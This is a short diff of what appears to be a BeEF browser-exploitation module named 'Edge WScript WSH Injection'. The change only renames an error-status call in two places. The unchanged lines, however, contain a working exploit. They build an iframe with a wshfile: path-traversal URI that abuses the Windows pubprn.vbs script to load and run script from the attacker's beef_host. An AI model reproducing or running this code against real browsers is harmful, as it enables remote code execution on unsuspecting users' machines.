@@ -9,7 +9,7 @@ beef.execute(function(){
 
   if (!beef.browser.isEdge()) {
     beef.debug("[Edge WScript WSH Injection] Browser is not supported.");
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser is not supported', beef.are.status_error());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser is not supported', beef.status.error());
     return;
   }
 
@@ -19,7 +19,7 @@ beef.execute(function(){
     wsh_iframe_<%= @command_id %>.setAttribute('src', 'wshfile:test/../../../../../../../Windows/System32/Printing_Admin_Scripts/' + navigator.language + '/pubprn.vbs" 127.0.0.1 script:' + beef_host + '/<%= @command_id %>/index.html');
   } catch (e) {
     beef.debug("[Edge WScript WSH Injection] Could not create iframe");
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Could not create iframe', beef.are.status_error());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Could not create iframe', beef.status.error());
     return;
   }
 
